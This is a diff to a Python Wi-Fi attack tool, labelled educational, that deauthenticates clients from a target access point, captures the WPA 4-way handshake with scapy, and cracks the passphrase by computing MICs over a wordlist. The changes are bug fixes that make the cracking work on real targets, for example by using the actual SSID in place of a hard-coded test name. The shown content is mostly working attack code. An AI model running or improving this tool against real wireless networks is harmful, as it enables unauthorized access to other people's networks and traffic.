@@ -23,7 +23,6 @@ cli_list = []
 to_frames = []
 from_frames = []
 ap_list_temp = []
-temp_frames = []
 temp_cli_mac = None
 interface = ""
 captured_handshake = False
@@ -40,8 +39,6 @@ class AP:
         self.ssid = ssid
         self.channel = channel
         self.cipher = cipher
-        self.handshake = False
-        self.frames = []
         self.client_mac = None
     def print_ap(self):
         print("MAC: " + TGREEN + self.mac + TWHITE +  " SSID: " + TGREEN + self.ssid + TWHITE + " CH: " + TGREEN + str(self.channel) + TWHITE + " CIPHER: " + TGREEN + self.cipher + TWHITE)
@@ -57,7 +54,7 @@ def banner():
 |___/\__\__,_| .__/\_, |_| |_|
              |_|   |__/
 
-Version: 0.9
+Version: 1.0
 Author: Guyard Félix
 Use for educational purpose only.
 """
@@ -226,8 +223,7 @@ def checkForWPAHandshake(p):
     pktdump =  PcapWriter('./handshake/handshake.pcap',append=True,sync=True)
     if EAPOL in p:
         pktdump.write(p)
-        DS = p.FCfield & DS_FLAG
-        to_ds = p.FCfield & TO_DS != 0
+        to_ds = p.FCfield & TO_DS != 0 # Identify the direction of the message C->AP or AP->
         if to_ds:
             client = p.addr2 #The client send EAPOL Frame
         else:
@@ -244,7 +240,7 @@ def checkForWPAHandshake(p):
         else:
             from_frames[idx] = from_frames[idx] + 1
         # See if we captured 4 way handshake
-        if (to_frames[idx] >= 2) and (from_frames[idx] >=2):
+        if (to_frames[idx] == 2) and (from_frames[idx] == 2):
             captured_handshake = True
             return True
 
@@ -268,13 +264,12 @@ def grab_handshake(ap):
     from threading import Thread
     t = Thread(target=deauth,args=(ap, ))
     t.start()
+
     p = sniff(iface=interface, stop_filter=checkForWPAHandshake) #Sniff for handshake
 
     print(TGREEN + "!Handshake Grabbed!" + TWHITE)
     t.join()
     os.system("mv ./handshake/handshake.pcap ./handshake/handshake-"+ap.ssid+".pcap")
-    ap.handshake = True     # Save the fact that we have the handshake for this AP
-
 
 #This is the handshake_grabber main function.
 #It is asking the user to select the AP they want to sniff
@@ -331,7 +326,7 @@ handshake cracking function
 Steps :
 Open the pcap
 Isolate the necessary frame field to fabricate our own EAPOL with PTK/PMK/MIC
-Compute the MIC with the sniffed isolated fields and the PSK given by the wordlist
+Compute the MIC with the sniffed isolated fields and the PSKs given by the wordlist
 Compare the computed MIC to the Client Frame MIC
 Do the above steps until the C_MIC = F_MIC
 """
@@ -339,7 +334,7 @@ Do the above steps until the C_MIC = F_MIC
 def crack_handshake(ap_ssid,pcap,wordlist):
     os.system("clear")
     packets = rdpcap(pcap)
-    ssid = "Test_AP"
+    ssid = ap_ssid
     pke = b"Pairwise key expansion"
     ap_mac = packets[0].addr2.replace(':','',5)
     cl_mac = packets[0].addr1.replace(':','',5)
@@ -372,7 +367,7 @@ def crack_handshake(ap_ssid,pcap,wordlist):
             print("PTK :",end="")
             print(pairwise_transient_key.hex())
 
-            print("MIC : ",end="")
+            print("Intercepted MIC : ",end="")
             print(message_integrity_check)
 
             print("Calculated MIC : ",end="")
@@ -383,7 +378,6 @@ def crack_handshake(ap_ssid,pcap,wordlist):
             exit(1)
     print("KEY NOT FOUND...")
 
-#This function is interacting with the user and launch the crack on the specified handshake and wordlist
 def handshake_cracker():
     signal.signal(signal.SIGINT, signal.SIG_DFL)
     path = './handshake/'
@@ -407,7 +401,7 @@ def handshake_cracker():
              if valid == True:
                 word_path = input("Enter Wordlist Path : ")
                 if os.path.isfile(word_path):
-                    crack_handshake(files[choice][10:],path+files[choice],word_path)
+                    crack_handshake(files[choice][10:].replace(".pcap",""),path+files[choice],word_path)
                 else:
                     print ("Wordlist Not Found")
                     exit(1)
